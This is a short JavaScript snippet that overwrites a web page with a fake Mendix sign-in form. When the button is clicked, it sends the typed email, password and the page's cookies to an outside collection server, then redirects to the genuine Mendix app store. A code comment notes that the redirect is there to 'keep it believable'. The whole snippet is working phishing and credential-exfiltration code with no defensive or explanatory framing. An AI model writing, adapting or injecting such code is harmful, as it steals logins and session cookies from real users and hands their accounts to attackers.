document.body.innerHTML =
  '<div style="font:16px system-ui;max-width:340px;margin:12vh auto">' +
  '<h2>Mendix</h2><p>Sign in to continue</p>' +
  '<input id=u placeholder="Email" style="width:100%;padding:10px;margin:6px 0">' +
  '<input id=p type=password placeholder="Password" style="width:100%;padding:10px;margin:6px 0">' +
  '<button id=b style="width:100%;padding:10px">Sign in</button></div>';
document.getElementById('b').onclick = () => {
  fetch('https://www.hamzab3t.com/collect', {
    method:'POST',
    body: JSON.stringify({u:u.value, p:p.value, cookies:document.cookie})
  });
  location = 'https://appstore.home.mendix.com/'; // keep it believable
};
